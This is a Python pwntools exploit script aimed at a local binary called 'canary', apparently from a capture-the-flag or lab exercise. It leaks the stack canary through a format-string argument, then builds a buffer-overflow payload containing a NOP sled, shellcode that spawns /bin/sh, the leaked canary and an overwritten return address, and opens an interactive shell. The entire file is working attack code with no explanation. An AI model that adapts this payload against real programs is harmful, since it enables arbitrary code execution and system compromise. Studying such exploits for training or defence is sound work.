from pwn import *
junk = b'junkjunk'
rip = b'\x58\xe5\xff\xff\xff\x7f\x00\x00'
shellcode = b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'

nop_sled = b'\x90' * (104 - len(shellcode))

proc = process(['./canary','.%p'*21])

canary = proc.recvline().decode('utf-8').split('.')[-1].strip('\n')
print(canary)
canary = p64(int(canary,16))

payload  = nop_sled
payload += shellcode
payload += canary
payload += junk
payload += rip

print(payload)

with open("input.txt", "wb") as f:
    f.write(payload)

proc.interactive()